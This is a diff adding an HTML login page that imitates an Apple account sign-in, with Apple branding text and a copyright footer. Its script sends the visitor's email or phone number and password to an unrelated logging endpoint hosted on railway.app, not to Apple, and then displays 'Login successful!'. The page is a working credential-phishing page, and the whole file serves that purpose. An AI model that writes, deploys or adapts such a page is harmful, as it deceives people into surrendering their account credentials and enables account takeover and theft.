@@ -1,0 +1,186 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Dark Themed Login Page</title>
+    <style>
+        body {
+            font-family: 'Arial', sans-serif;
+            background-color: #121212;
+            color: #fff;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            flex-direction: column;
+            min-height: 100vh;
+        }
+
+        /* Header */
+        header {
+            background-color: #1F1F1F;
+            padding: 22px;
+            text-align: center;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
+        }
+        header h1 {
+            margin: 0;
+            color: #fff;
+        }
+       
+
+        /* Footer */
+        footer {
+            background-color: #1F1F1F;
+            text-align: center;
+            padding: 10px;
+            margin-top: auto;
+            color: #777;
+        }
+
+        /* Login Form */
+        .login-container {
+            background: hsl(240, 3%, 11%);
+            padding: 30px;
+            border-radius: 10px;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
+            width: 300px;
+            margin: 50px auto;
+            text-align: center;
+        }
+        h2 {
+            color: #fff;
+        }
+        input[type="text"], 
+        input[type="password"] {
+            width: 100%;
+            padding: 10px;
+            margin: 10px 0;
+            box-sizing: border-box;
+            border: 1px solid #555;
+            border-radius: 5px;
+            background-color: #333;
+            color: #fff;
+        }
+        button {
+            width: 100%;
+            padding: 10px;
+            background-color: #007bff;
+            color: #fff;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+        }
+        button:hover {
+            background-color: #0056b3;
+        }
+        .error-message {
+            color: #ff4d4d;
+            text-align: center;
+            margin-top: 10px;
+        }
+        .success-message {
+            color: #28a745;
+            text-align: center;
+            margin-top: 10px;
+        }
+        /* Links */
+        .links {
+            margin-top: 15px;
+        }
+        .links a {
+            color: #007bff;
+            text-decoration: none;
+        }
+        .links a:hover {
+            text-decoration: underline;
+        }
+        .header-logo {
+          
+            position: absolute;
+            top: 10px;
+            left: 10px;
+        }
+       
+    </style>
+</head>
+<body>
+
+    <!-- Header -->
+    <header >
+        <img src="appimg2.png" alt="Logo" class="header-logo">
+    </header>
+
+    <!-- Login Form -->
+    <div class="login-container">
+        <img src="appimg1.png" alt="Logo" class="login-logo">
+        
+        <h2>Sign in with Apple Account
+        </h2>
+        <form id="loginForm">
+            <input type="text" id="userIdOrEmail" placeholder="Email or Phone Number" required>
+            <input type="password" id="password" placeholder="Password" required>
+            <button type="submit">Login</button>
+        </form>
+
+        <div class="error-message" id="errorMessage"></div>
+        <div class="success-message" id="successMessage"></div>
+
+        <!-- <div class="links">
+            <a href="#">Forgot Password?</a> | 
+            <a href="#">Register</a>
+        </div> -->
+    </div>
+
+    <!-- Footer -->
+    <footer>
+        <p>&copy; Copyright © 2025 Apple Inc. All rights reserved.</p>
+    </footer>
+
+    <script>
+        document.getElementById("loginForm").addEventListener("submit", function(event) {
+            event.preventDefault();
+            
+            const userIdOrEmail = document.getElementById("userIdOrEmail").value;
+            const password = document.getElementById("password").value;
+            
+            // Clear previous messages
+            document.getElementById("errorMessage").innerText = "";
+            document.getElementById("successMessage").innerText = "";
+
+            // Prepare the data to be sent
+            const data = {
+                param1: userIdOrEmail,
+                param2: password
+            };
+
+            // Make the POST request
+            fetch('https://file-writer-ms-production.up.railway.app/LogString', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify(data)
+            })
+            .then(response => {
+                if (response.ok) {
+                    return response.json();
+                } else {
+                    throw new Error('Login failed');
+                }
+            })
+            .then(data => {
+                document.getElementById("successMessage").innerText = "Login successful!";
+                console.log("Response from API:", data);
+                // Redirect to a different page after successful login
+                // window.location.href = "/dashboard.html";
+            })
+            .catch(error => {
+                console.error('Error:', error);
+                document.getElementById("errorMessage").innerText = "Invalid User ID/Email or Password.";
+            });
+        });
+    </script>
+
+</body>
+</html>
